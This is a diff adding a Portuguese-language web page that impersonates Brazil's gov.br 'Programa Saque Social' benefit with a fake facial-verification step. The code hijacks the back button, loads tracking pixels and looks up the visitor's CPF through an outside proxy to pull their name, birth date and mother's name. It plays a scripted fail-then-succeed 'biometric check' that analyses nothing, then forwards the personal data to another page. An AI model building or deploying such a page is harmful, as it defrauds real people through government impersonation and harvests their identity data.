@@ -1,0 +1,535 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <script>
+    window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+    var a = document.createElement("script");
+    a.setAttribute("async",""); a.setAttribute("defer","");
+    a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - Verificação</title>
+  <link rel="icon" href="images/favic.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    var urlBackRedirect = '../back.html'.trim() + ('./back.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?','');
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function(){ setTimeout(function(){ location.href = urlBackRedirect; }, 1); };
+  </script>
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <style>
+    :root {
+      --gov-blue-primary: #1351B4;
+      --gov-blue-secondary: #0F4DA8;
+      --gov-blue-light: #E8F4FD;
+      --gov-blue-dark: #0C326F;
+      --gov-green: #168821;
+      --gov-gray-light: #F8F9FA;
+      --gov-gray-medium: #E5E5E5;
+      --gov-gray-dark: #495057;
+      --gov-white: #FFFFFF;
+      --gov-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --gov-shadow-hover: 0 4px 12px rgba(0,0,0,0.15);
+      --border-radius: 8px;
+      --transition: all 0.3s ease;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; overflow-x:hidden; }
+    body {
+      font-family:'Inter','Source Sans Pro',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+      background:#fff; min-height:100vh; color:var(--gov-gray-dark);
+      line-height:1.6; display:flex; flex-direction:column;
+      -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
+    }
+
+    /* LOADING */
+    #loading-screen {
+      position:fixed; inset:0; background:#fff;
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      z-index:9999;
+    }
+    #loading-screen.hidden { display:none !important; }
+
+    /* HEADER */
+    header {
+      background:var(--gov-white); padding:16px 24px;
+      display:flex; justify-content:space-between; align-items:center;
+      box-shadow:var(--gov-shadow); position:sticky; top:0; z-index:1000;
+      border-bottom:3px solid var(--gov-blue-primary);
+    }
+    header .logo { display:flex; align-items:center; }
+    header .logo img { height:40px; width:auto; filter:drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+    header .icons { display:flex; align-items:center; gap:12px; }
+    header .icons button { background:none; border:none; padding:8px; cursor:pointer; transition:var(--transition); color:var(--gov-blue-primary); }
+    header .icons button:hover { background:var(--gov-blue-light); transform:translateY(-1px); }
+    header .icons button i { font-size:16px; }
+    header .user { background-color:#1451b4; color:#fff; border:none; border-radius:50px; padding:6px 16px; display:flex; align-items:center; cursor:pointer; }
+    header .user i { margin-right:8px; }
+
+    /* NAV */
+    nav {
+      background:var(--gov-white); padding:12px 24px;
+      display:flex; justify-content:space-between; align-items:center;
+      border-bottom:1px solid var(--gov-gray-medium);
+      position:sticky; top:79px; z-index:999;
+    }
+    nav button { background:none; border:none; display:flex; align-items:center; cursor:pointer; padding:8px 12px; border-radius:var(--border-radius); transition:var(--transition); }
+    nav button:hover { background:var(--gov-gray-light); }
+    nav button i { font-size:16px; color:var(--gov-blue-primary); margin-right:8px; }
+    nav button p { color:var(--gov-gray-dark); font-size:14px; font-weight:400; margin:0; }
+    nav button span { color:var(--gov-blue-primary); font-weight:500; }
+
+    /* MAIN */
+    #main-content {
+      padding:0 24px 80px; max-width:720px;
+      flex:1 0 auto; margin:0 auto; width:100%;
+    }
+    #main-content.hidden { display:none; }
+
+    .cam-title { font-size:18px; font-weight:700; color:#111; margin-top:20px; margin-bottom:2px; }
+    .cam-sub   { font-size:13px; color:#78909c; margin-bottom:16px; }
+
+    /* PILL */
+    .gov-pill {
+      display:none; margin:0 auto 16px auto;
+      background:#2196F3; color:#fff;
+      font-size:15px; font-weight:500;
+      padding:10px 32px; border-radius:50px;
+      text-align:center; width:fit-content; max-width:92%;
+      box-shadow:0 2px 10px rgba(33,150,243,.22);
+    }
+    .gov-pill.show { display:block; animation:fadeIn .2s ease; }
+    .gov-pill.err  { background:#e53935; }
+    .gov-pill.ok   { background:#2e7d32; }
+
+    /* CARD */
+    .cam-card { display:flex; flex-direction:column; align-items:center; }
+
+    /* OVAL */
+    .oval-wrap {
+      position:relative; width:80%; aspect-ratio:4/5;
+      border-radius:50%; overflow:hidden;
+      border:4px solid #1565C0; background:#cfd8dc;
+      transition:border-color .4s, box-shadow .4s;
+    }
+    .oval-wrap.idle      { border-color:#1565C0; animation:idlePulse 2.5s ease-in-out infinite; }
+    .oval-wrap.capturing { border-color:#1565C0; box-shadow:0 0 0 5px rgba(21,101,192,.15); animation:none; }
+    .oval-wrap.error     { border-color:#b71c1c; box-shadow:0 0 0 6px rgba(183,28,28,.15); animation:shake .45s ease; }
+    .oval-wrap.success   { border-color:#2e7d32; box-shadow:0 0 0 6px rgba(46,125,50,.18); animation:none; }
+    @keyframes idlePulse {
+      0%,100%{ box-shadow:0 0 0 3px rgba(21,101,192,.15); }
+      50%    { box-shadow:0 0 0 9px rgba(21,101,192,.04); }
+    }
+    @keyframes shake {
+      0%,100%{ transform:translateX(0); }
+      20%{ transform:translateX(-7px); } 40%{ transform:translateX(7px); }
+      60%{ transform:translateX(-4px); } 80%{ transform:translateX(4px); }
+    }
+
+    /* VÍDEO */
+    #cam-video {
+      position:absolute; inset:0; width:100%; height:100%;
+      object-fit:cover; transform:scaleX(-1);
+      display:none; pointer-events:none;
+    }
+    #cam-video::-webkit-media-controls,
+    #cam-video::-webkit-media-controls-enclosure,
+    #cam-video::-webkit-media-controls-panel,
+    #cam-video::-webkit-media-controls-overlay-play-button,
+    #cam-video::-webkit-media-controls-play-button,
+    #cam-video::-webkit-media-controls-start-playback-button {
+      display:none !important; -webkit-appearance:none;
+    }
+
+    /* PLACEHOLDER */
+    .cam-ph {
+      position:absolute; inset:0; display:flex; flex-direction:column;
+      align-items:center; justify-content:center; gap:10px; background:#cfd8dc;
+    }
+    .cam-ph i { font-size:52px; color:rgba(0,0,0,.15); }
+    .cam-ph p { font-size:12px; color:rgba(0,0,0,.32); text-align:center; padding:0 20px; line-height:1.5; }
+
+    /* OVERLAYS */
+    .err-overlay, .suc-overlay {
+      position:absolute; inset:0; display:none; flex-direction:column;
+      align-items:center; justify-content:center; gap:10px; z-index:20;
+      color:#fff; text-align:center; padding:24px;
+    }
+    .err-overlay { background:rgba(183,28,28,.92); }
+    .suc-overlay { background:rgba(27,94,32,.90); }
+    .err-overlay.show, .suc-overlay.show { display:flex; animation:fadeIn .3s ease; }
+    .err-overlay i, .suc-overlay i { font-size:44px; }
+    .err-overlay h3, .suc-overlay h3 { font-size:16px; font-weight:700; margin:0; }
+    .err-overlay p,  .suc-overlay p  { font-size:12px; opacity:.9; margin:0; line-height:1.4; }
+
+    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+
+    /* FOOTER */
+    footer {
+      background:linear-gradient(135deg,var(--gov-blue-dark),#0B1A38);
+      color:#fff; text-align:center; padding:16px; font-size:14px; flex-shrink:0;
+    }
+    @media(max-width:768px){
+      header{ padding:12px 16px; } header .logo img{ height:32px; }
+      #main-content{ padding:0 16px 80px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loading-screen">
+    <img src="images/govbr.png" style="width:140px;margin:10px;">
+  </div>
+
+  <header>
+    <div class="logo">
+      <img src="images/govbr.png" style="width:90px;margin:10px;">
+    </div>
+    <div class="icons">
+      <button><i class="fas fa-ellipsis-v"></i></button>
+      <button><i class="fas fa-cookie-bite"></i></button>
+      <button><i class="fas fa-th"></i></button>
+      <button class="user" id="user-button" style="background-color:#1451b4;">
+        <i class="fas fa-user" style="color:#fff;"></i>
+        <span id="header-user-name" style="color:#fff;">Usuário</span>
+      </button>
+    </div>
+  </header>
+
+  <nav>
+    <button>
+      <i class="fas fa-bars"></i>
+      <p>Benefício <span> › </span> Indenização <span> › </span> Análise</p>
+    </button>
+    <button><i class="fas fa-search"></i></button>
+  </nav>
+
+  <main id="main-content" class="hidden">
+
+    <p class="cam-title">Verificação Facial</p>
+    <p class="cam-sub">Siga as instruções para confirmar sua identidade.</p>
+
+    <div class="gov-pill" id="gov-pill"></div>
+
+    <div class="cam-card">
+      <div class="oval-wrap idle" id="oval-wrap">
+
+        <video id="cam-video" autoplay muted playsinline
+          disablePictureInPicture webkit-playsinline x-webkit-airplay="deny">
+        </video>
+
+        <div class="cam-ph" id="cam-ph">
+          <i class="fas fa-user-circle"></i>
+          <p>Abrindo câmera...</p>
+        </div>
+
+        <div class="err-overlay" id="err-overlay">
+          <i class="fas fa-times-circle"></i>
+          <h3>Não foi possível verificar</h3>
+          <p>Iluminação insuficiente ou rosto<br>fora da área de captura.</p>
+        </div>
+
+        <div class="suc-overlay" id="suc-overlay">
+          <i class="fas fa-check-circle"></i>
+          <h3>Identidade Confirmada</h3>
+          <p>Biometria validada com sucesso.</p>
+        </div>
+
+      </div>
+    </div>
+
+    <span id="cpf-value"    style="display:none"></span>
+    <span id="name-value"   style="display:none"></span>
+    <span id="birth-value"  style="display:none"></span>
+    <span id="mother-value" style="display:none"></span>
+
+  </main>
+
+  <footer>Termos de Uso e Aviso de Privacidade
+    <p style="margin-top:8px;font-size:13px;">
+      <a href="termos-uso.html" style="color:var(--gov-blue-primary);text-decoration:none;margin-right:12px;">Termos de Uso</a>
+      <a href="politica-privacidade.html" style="color:var(--gov-blue-primary);text-decoration:none;">Política de Privacidade</a>
+    </p>
+  </footer>
+
+  <script>
+    const delay = ms => new Promise(r => setTimeout(r, ms));
+
+    function formatarNome(n) {
+      if (!n) return '';
+      return n.toLowerCase().split(' ').filter(p=>p)
+        .map(p => p[0].toUpperCase()+p.slice(1)).join(' ');
+    }
+    function formatarCPF(c) {
+      return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+    }
+
+    const $ = id => document.getElementById(id);
+
+    const elLoading = $('loading-screen');
+    const elMain    = $('main-content');
+    const elPill    = $('gov-pill');
+    const elOval    = $('oval-wrap');
+    const elVideo   = $('cam-video');
+    const elPh      = $('cam-ph');
+    const elErr     = $('err-overlay');
+    const elSuc     = $('suc-overlay');
+    const elHdrName = $('header-user-name');
+
+    let userData   = null;
+    let stream     = null;
+    let facingMode = 'user';
+
+    // ── Pill ──
+    function pill(txt, cls) {
+      elPill.textContent = txt;
+      elPill.className   = 'gov-pill show' + (cls ? ' '+cls : '');
+    }
+    function hidePill() { elPill.className = 'gov-pill'; }
+
+    // ════════════════════════════════════════
+    //  VOZ — Web Speech API
+    // ════════════════════════════════════════
+    let vozPronta       = null;
+    let vozDesbloqueada = false;
+
+    function desbloquearVoz() {
+      if (vozDesbloqueada || !window.speechSynthesis) return;
+      vozDesbloqueada = true;
+      const u = new SpeechSynthesisUtterance(' ');
+      u.volume = 0;
+      window.speechSynthesis.speak(u);
+    }
+
+    function carregarVoz() {
+      return new Promise(resolve => {
+        function buscar() {
+          const lista = window.speechSynthesis ? window.speechSynthesis.getVoices() : [];
+          if (lista.length) {
+            vozPronta =
+              lista.find(v => /google/i.test(v.name) && v.lang === 'pt-BR') ||
+              lista.find(v => v.lang === 'pt-BR') ||
+              lista.find(v => v.lang.startsWith('pt-BR')) ||
+              lista.find(v => v.lang.startsWith('pt')) ||
+              lista[0];
+            resolve();
+            return true;
+          }
+          return false;
+        }
+        if (!buscar()) {
+          if (window.speechSynthesis) {
+            window.speechSynthesis.onvoiceschanged = () => { buscar(); resolve(); };
+          }
+          setTimeout(resolve, 2000);
+        }
+      });
+    }
+
+    function falar(texto) {
+      if (!window.speechSynthesis) return Promise.resolve();
+      return new Promise(resolve => {
+        window.speechSynthesis.cancel();
+        setTimeout(() => {
+          window.speechSynthesis.resume();
+          const u = new SpeechSynthesisUtterance(texto);
+          u.lang  = 'pt-BR';
+          u.rate  = 0.88;
+          u.pitch = 1.15;
+          u.volume = 1;
+          if (vozPronta) u.voice = vozPronta;
+          const ki = setInterval(() => {
+            if (window.speechSynthesis.paused) window.speechSynthesis.resume();
+          }, 2000);
+          const done = () => { clearInterval(ki); resolve(); };
+          u.onend = done; u.onerror = done;
+          window.speechSynthesis.speak(u);
+        }, 150);
+      });
+    }
+
+    function silenciar() {
+      if (window.speechSynthesis) window.speechSynthesis.cancel();
+    }
+
+    function dizer(txt, cls) {
+      pill(txt, cls);
+      falar(txt);
+    }
+
+    // ── Câmera ──
+    async function abrirCamera() {
+      if (stream && stream.active) {
+        elVideo.srcObject     = stream;
+        elVideo.style.display = 'block';
+        elPh.style.display    = 'none';
+        return;
+      }
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video:{ facingMode, width:{ideal:1280}, height:{ideal:720} }, audio:false
+        });
+        desbloquearVoz();
+        elVideo.srcObject     = stream;
+        elVideo.style.display = 'block';
+        elPh.style.display    = 'none';
+      } catch(e) {
+        elVideo.style.display = 'none';
+      }
+    }
+
+    function esconderVideo() { elVideo.style.display = 'none'; }
+
+    function fecharCamera() {
+      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+      elVideo.style.display = 'none';
+    }
+
+    function resetVisual() {
+      elErr.classList.remove('show');
+      elSuc.classList.remove('show');
+      elOval.className = 'oval-wrap idle';
+    }
+
+    function redirecionar() {
+      const p = new URLSearchParams(window.location.search);
+      if (userData) {
+        p.set('nome',       formatarNome(userData.nome));
+        p.set('mae',        userData.mae ? formatarNome(userData.mae) : 'Não Informado');
+        p.set('nascimento', userData.nascimento);
+        p.set('cpf',        formatarCPF(userData.cpf || ''));
+      }
+      window.location.href = `../chat2.html?${p.toString()}`;
+    }
+
+    // ════════════════════════════════════════
+    //  FLUXO PRINCIPAL
+    // ════════════════════════════════════════
+    async function iniciar() {
+      resetVisual(); hidePill();
+      await carregarVoz();
+      await abrirCamera();
+      await delay(800);
+
+      dizer('Posicione seu rosto na altura dos olhos.');
+      await delay(3500);
+
+      elOval.className = 'oval-wrap capturing';
+      dizer('Centralize seu rosto dentro do círculo.');
+      await delay(3500);
+
+      dizer('Por favor, aguarde.');
+      await delay(3000);
+
+      /* ══ FALHA ══ */
+      silenciar();
+      elOval.className = 'oval-wrap error';
+      await delay(300);
+      elErr.classList.add('show');
+      dizer('Não foi possível verificar. Vamos tentar novamente.', 'err');
+      await delay(4000);
+
+      /* reset */
+      elErr.classList.remove('show');
+      silenciar();
+      esconderVideo();
+      resetVisual(); hidePill();
+      elPh.style.display = 'flex';
+      elPh.innerHTML = `
+        <i class="fas fa-spinner fa-spin" style="font-size:40px;color:rgba(0,0,0,.14);"></i>
+        <p style="color:rgba(0,0,0,.28);font-size:12px;margin-top:8px;">Aguarde...</p>`;
+      await delay(1500);
+
+      /* ══ SEGUNDA TENTATIVA → SUCESSO ══ */
+      await abrirCamera();
+      await delay(800);
+
+      elOval.className = 'oval-wrap capturing';
+      dizer('Por favor, mantenha o olhar diretamente para a câmera.');
+      await delay(3800);
+
+      dizer('Por favor, aguarde.');
+      await delay(3000);
+
+      /* sucesso */
+      silenciar();
+      elOval.className = 'oval-wrap success';
+      elSuc.classList.add('show');
+      dizer('Identidade confirmada com sucesso.', 'ok');
+      await delay(3000);
+      fecharCamera();
+      redirecionar();
+    }
+
+    // ════════════════════════════════════════
+    //  BUSCA DADOS — CPF OBRIGATÓRIO
+    // ════════════════════════════════════════
+    async function fetchUserData() {
+      const params = new URLSearchParams(window.location.search);
+      const cpf    = params.get('cpf');
+
+      if (!cpf || cpf.replace(/\D/g,'').length < 11) {
+        const check = setInterval(() => {
+          const c = new URLSearchParams(window.location.search).get('cpf');
+          if (c && c.replace(/\D/g,'').length === 11) {
+            clearInterval(check); fetchUserData();
+          }
+        }, 2000);
+        return;
+      }
+
+      try {
+        const cleanCPF   = cpf.replace(/\D/g,'');
+        const controller = new AbortController();
+        const t          = setTimeout(() => controller.abort(), 10000);
+        const res        = await fetch(
+          `https://proxy-ativo.vercel.app/api/proxy?cpf=${cleanCPF}`,
+          { signal: controller.signal }
+        );
+        clearTimeout(t);
+        if (!res.ok) throw new Error('api error');
+        const json = await res.json();
+        const d    = json.dadosBasicos;
+        if (!d || !d.nome) throw new Error('sem dados');
+        userData = { nome:d.nome||'', cpf:d.cpf||cleanCPF, nascimento:d.nascimento||'', mae:d.mae||'' };
+        const nomeOk = formatarNome(userData.nome);
+        elHdrName.textContent         = nomeOk.split(' ')[0];
+        $('name-value').textContent   = nomeOk;
+        $('cpf-value').textContent    = formatarCPF(userData.cpf||cleanCPF);
+        $('birth-value').textContent  = userData.nascimento;
+        $('mother-value').textContent = userData.mae ? formatarNome(userData.mae) : 'Não Informado';
+      } catch(e) {
+        console.error('fetchUserData:', e);
+        userData = { nome:'', cpf:cpf.replace(/\D/g,''), nascimento:'', mae:'' };
+      }
+
+      elLoading.classList.add('hidden');
+      elMain.classList.remove('hidden');
+      iniciar();
+    }
+
+    fetchUserData();
+
+    document.addEventListener('touchstart', desbloquearVoz, { once: true });
+    document.addEventListener('click',      desbloquearVoz, { once: true });
+  </script>
+
+</body></html>
